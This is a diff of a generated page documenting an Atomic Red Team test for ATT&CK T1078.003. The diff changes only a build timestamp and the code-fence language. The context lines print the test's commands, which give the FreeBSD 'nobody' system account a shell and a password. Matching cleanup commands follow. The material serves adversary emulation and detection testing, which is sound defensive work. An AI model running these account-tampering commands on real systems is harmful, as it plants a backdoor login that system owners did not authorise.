@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1078.003"
 attack_technique_name: "Valid Accounts: Local Accounts"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.003/T1078.003.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "sh"
 aliases:
   - "16f6374f-7600-459a-9b16-6a88fd96d310"
@@ -44,7 +44,7 @@ An adversary may try to re-purpose a system account to appear legitimate. In thi
 
 ### Command
 
-```sh
+```bash
 cat /etc/passwd |grep nobody
 pw usermod nobody -s /bin/sh
 echo $(openssl passwd -1 art) | pw mod user nobody -h 0
@@ -55,7 +55,7 @@ exit
 
 ### Cleanup
 
-```sh
+```bash
 pw usermod nobody -s /usr/sbin/nologin
 cat /etc/passwd |grep nobody
 # -> nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
